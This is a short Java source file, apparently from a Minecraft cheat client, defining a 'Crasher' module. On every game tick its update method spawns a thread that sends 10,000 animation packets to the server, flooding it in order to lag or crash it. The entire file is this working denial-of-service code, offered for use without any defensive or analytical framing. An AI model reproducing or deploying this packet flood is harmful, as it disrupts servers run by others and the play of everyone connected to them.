package neko.module.modules.misc;

import neko.module.Category;
import neko.module.Module;
import net.minecraft.network.play.client.C0APacketAnimation;

public class Crasher extends Module {
	
	public Crasher() {
		super("Crasher", -1, Category.MISC);
	}
	
	public void onEnabled() {		
		super.onEnabled();
	}
	
	public void onDisabled() {
		super.onDisabled();
	}	

	public void onUpdate() {
		new Thread(new Runnable() {
			
			@Override
			public void run() {
				for (int i=0;i<10000;i++)
					mc.thePlayer.sendQueue.addToSendQueue(new C0APacketAnimation());
			}
		}).start();
		
	}
	
}
